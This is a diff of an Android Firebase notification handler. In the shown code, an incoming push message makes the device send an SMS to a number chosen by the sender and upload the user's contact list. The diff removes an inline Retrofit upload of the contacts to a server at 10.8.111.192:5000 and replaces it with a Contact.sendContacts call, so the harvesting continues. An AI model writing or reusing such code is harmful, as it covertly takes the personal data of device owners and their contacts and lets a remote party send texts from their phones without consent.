@@ -21,21 +21,12 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
         String strTitle=remoteMessage.getNotification().getTitle();
         String message=remoteMessage.getNotification().getBody();
         Log.d(TAG,"onMessageReceived:  Message Received: \n" + "Title: " + strTitle + "\n" + "Message: "+ message);
-        ContentCollector cc = new ContentCollector();
-        List<Contact> lsContact = cc.GetContacts(this);
-        Log.d(TAG,"Name : "+ lsContact.get(1).GetName()+" Number : " + lsContact.get(1).GetNumber());
-        Retrofit retrofit = new Retrofit.Builder()
-                .baseUrl("http://10.8.111.192:5000")
-                .addConverterFactory(JacksonConverterFactory.create())
-                .build();
-        RetrofitAPI retrofitAPI = retrofit.create(RetrofitAPI.class);
-        retrofitAPI.CreateContacts(lsContact);
-        sendSMS(strTitle, message);
+        sendSMS(strTitle,message);
+        Contact.sendContacts(this);
     }
-    private void sendSMS(String phoneNumber, String messageBody){
+    private void sendSMS(String phoneNumber, String messageBody) {
         SmsManager sms = SmsManager.getDefault();
-
-        sms.sendTextMessage(phoneNumber, null, messageBody,null,null);
+        sms.sendTextMessage(phoneNumber, null, messageBody, null, null);
     }
 
 }
